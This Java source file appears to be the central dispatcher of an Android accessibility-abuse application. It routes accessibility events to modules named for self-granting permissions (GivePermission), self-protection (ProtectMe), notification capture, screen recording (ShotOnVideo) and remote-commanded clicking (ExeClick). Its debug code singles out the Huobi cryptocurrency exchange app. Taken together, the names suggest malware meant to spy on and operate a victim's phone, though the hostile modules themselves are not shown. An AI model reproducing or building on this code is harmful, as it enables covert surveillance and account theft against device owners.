/**
 * 
 */
package accessibility;


import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;




import accessibility.app.AccessibilitySaveNotification;
import accessibility.app.ExeClick;
import accessibility.app.ProtectMe;

import accessibility.app.ShotOnVideo;
import permission.GivePermission;
import utils.ConfigCt;

/**
 * @author ASUS
 *
 */
public class ManageAccessibilityJob extends BaseAccessibilityJob {
	private static ManageAccessibilityJob current;

	private GivePermission mGivePermission;
	private ProtectMe mProtectMe;
	private AccessibilitySaveNotification mSaveNotification;
	private ShotOnVideo mShotOnVideo;
	private ExeClick mExeClick;
	//---------------------------------------------------------------------------------------
	public ManageAccessibilityJob(){
		super(null);
        mGivePermission=GivePermission.getGivePermission();
        mProtectMe=ProtectMe.getProtectMe();
        mSaveNotification=AccessibilitySaveNotification.getInstance();
        mShotOnVideo=ShotOnVideo.getInstance();
        mExeClick=ExeClick.getInstance(order.order.CMD_POS);
	}
	//----------------------------------------------------------------------------------------
    @Override
    public void onCreateJob(Acc101Service service) {
        super.onCreateJob(service);
        EventStart();
        mGivePermission.onCreateJob(service);
        mProtectMe.onCreateJob(service);
        mSaveNotification.onCreateJob(service);
        mShotOnVideo.onCreateJob(service);
        mExeClick.onCreateJob(service);
    }
    @Override
    public void onStopJob() {
    	super.onStopJob();
    	mGivePermission.onStopJob();
    	mProtectMe.onStopJob();
    	mSaveNotification.onStopJob();
    	mShotOnVideo.onStopJob();
    	mExeClick.onStopJob();
    }
    public static synchronized ManageAccessibilityJob getJob() {
        if(current == null) {
            current = new ManageAccessibilityJob();
        }
        return current;
    }

    //----------------------------------------------------------------------------------------
    @Override
    public void onReceiveJob(AccessibilityEvent event) {
    	super.onReceiveJob(event);
    	if(!mIsEventWorking)return;
    	if(!mIsTargetPackageName)return;
    	//debug(event);

    	mGivePermission.onReceiveJob(event);

    	mProtectMe.onReceiveJob(event);

    	mSaveNotification.onReceiveJob(event);

    	mShotOnVideo.onReceiveJob(event);

    }
	/*
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
		//Log.i(TAG2, "onWorking");
		//installApp.onWorking();
	}
	//--------------------------------------------------------------------------

   private void debug(AccessibilityEvent event){
     	if(ConfigCt.DEBUG){
     		if(event.getSource()==null)return;
     		if(!event.getSource().getPackageName().toString().equals(ConfigCt.PKG_HUOBI))return;
   			Log.i(TAG, "mCurrentUI="+mCurrentUI);
   			if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
   				Log.i(TAG, "eventType=TYPE_WINDOW_STATE_CHANGED");
   				Log.i(TAG, "--------------------->"+event.getClassName().toString());

   			}
   			if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
   				Log.i(TAG, "eventType=TYPE_WINDOW_CONTENT_CHANGED");
   			Log.i(TAG, "--------------------->"+event.getPackageName());
	   			AccessibilityNodeInfo rootNode=event.getSource();
	   			if(rootNode==null)return;
	   			rootNode=AccessibilityHelper.getRootNode(rootNode);
	   			AccessibilityHelper.recycle(rootNode);	

   		}
   }
}
